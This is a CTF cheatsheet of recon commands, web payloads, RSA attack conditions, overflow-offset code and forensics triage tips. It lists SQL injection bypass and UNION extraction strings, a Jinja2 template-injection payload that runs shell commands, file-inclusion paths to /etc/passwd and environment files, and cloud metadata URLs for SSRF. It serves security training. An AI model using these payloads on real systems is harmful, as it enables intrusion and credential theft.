# CTF Quick Reference & Payload Cheatsheet

> Domain: CTF Quick Reference, Payload Signatures & Extraction Commands
> Classification: AUTHORITATIVE REFERENCE
> Curated & Cross-Referenced from: Awesome-CTF, PayloadsAllTheThings, pwntools, RsaCtfTool, and zsteg

## 1. Quick Terminal Discovery One-Liners

```bash
# Web & API Quick Recon
curl -i -X OPTIONS http://target.lab/api/
curl -s -L http://target.lab/robots.txt
curl -s http://target.lab/.git/HEAD # Check for exposed .git directory

# File & Binary Quick Checks
file target_file
strings -a -n 6 target_file | grep -iE "flag|ctf|key|admin|pass"
binwalk -e target_file # Extract embedded archives

# omni-sec Standalone Toolkits (Zero-Dependency Python 3)
python scripts/cipher_toolkit.py --data "666c61677b... " --mode auto
python scripts/rsa_toolkit.py --n <N> --e <E> --c <C>
python scripts/stego_inspector.py --file mystery.png
python scripts/pcap_dissector.py --file capture.pcap
```

---

## 2. Web Vulnerabilities Matrix (Inspired by PayloadsAllTheThings)

### SQL Injection (Authentication Bypass & Extraction)
```sql
' OR '1'='1
admin' --
admin' #
' UNION SELECT NULL, username, password FROM users--
' UNION SELECT 1, tbl_name, sql FROM sqlite_master--
' UNION SELECT 1, table_name, column_name FROM information_schema.columns--
```

### Server-Side Template Injection (SSTI) Identification & Triage
| Engine | Detection Payload | Expected Output |
|---|---|---|
| Jinja2 / Twig | `{{ 7 * '7' }}` | `7777777` (Jinja2) or `49` (Twig) |
| Jinja2 (Python) | `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}` | `uid=...` |
| Express (Pug / EJS) | `<%= 7 * 7 %>` | `49` |
| Mako (Python) | `${ 7 * 7 }` | `49` |

### Local File Inclusion (LFI) & Filter Wrappers
```text
../../../../etc/passwd
....//....//....//etc/passwd
/proc/self/environ
php://filter/convert.base64-encode/resource=index.php
php://filter/read=string.rot13/resource=config.php
```

### Server-Side Request Forgery (SSRF) Cloud Metadata Endpoints
```text
http://169.254.169.254/latest/meta-data/ (AWS / OpenStack)
http://metadata.google.internal/computeMetadata/v1/ (GCP - Header Metadata-Flavor: Google)
http://169.254.169.254/metadata/instance?api-version=2021-02-01 (Azure)
```

---

## 3. Cryptanalysis & RSA Solver Matrix (Inspired by RsaCtfTool)

| Vulnerability / Scenario | Mathematical Condition | Attack Solver Method |
|---|---|---|
| **Small Public Exponent** | $m^e < N$ without padding | `m = integer_root(c, e)` |
| **Close Primes** | $\|p - q\| < N^{1/4}$ | Fermat's Factorization (difference of squares) |
| **Small Private Exponent** | $d < \frac{1}{3} N^{1/4}$ | Wiener's Continued Fraction Attack |
| **Common Modulus** | Same $N$, coprime $e_1, e_2$ | Extended Euclidean Combination: $c_1^{s_1} \cdot c_2^{s_2} \equiv m \pmod N$ |
| **Single-Byte XOR** | Repeated single byte key | Chi-squared frequency analysis over ASCII character set |

---

## 4. Binary Exploitation & Reverse Engineering (Inspired by pwntools)

### Buffer Overflow Offset Discovery
```python
from scripts.pwn_helper import cyclic, cyclic_find, p32, p64

# 1. Send pattern to binary
pattern = cyclic(200) # b'aaaabaaacaaa...'

# 2. Crash address from $eip / $rip
crash_val = 0x6161616c # 'laaa'
offset = cyclic_find(crash_val) # -> returns exact offset to instruction pointer
```

### Standard x86_64 Register Calling Convention (SysV ABI)
| Register | Purpose in 64-bit Linux |
|---|---|
| `RAX` | Return Value / Syscall Number |
| `RDI` | 1st Function Argument |
| `RSI` | 2nd Function Argument |
| `RDX` | 3rd Function Argument |
| `RCX` | 4th Function Argument / Loop Counter |
| `R8`  | 5th Function Argument |
| `R9`  | 6th Function Argument |
| `RSP` | Stack Pointer (top of stack) |
| `RIP` | Instruction Pointer (next executed address) |

---

## 5. Forensics & Steganography Matrix (Inspired by zsteg & binwalk)

| Technique | Indicators | Triage Action |
|---|---|---|
| **Magic Bytes Inspection** | File extension doesn't match header | Inspect header hex (`scripts/stego_inspector.py`) |
| **Trailing Payload** | Bytes exist past standard EOF (e.g. past `IEND` / `FF D9`) | Dump trailing slice (`--extract-trailing`) |
| **Polyglot Archive** | `PK\x03\x04` signature at non-zero offset | Extract with `binwalk -e` or `unzip` |
| **LSB Steganography** | High spatial visual noise in flat areas | Run LSB bitplane extractor (`parse_png_lsb`) |
| **PCAP Credential Leak** | Cleartext HTTP / FTP / Telnet traffic | Run PCAP Dissector (`scripts/pcap_dissector.py`) |
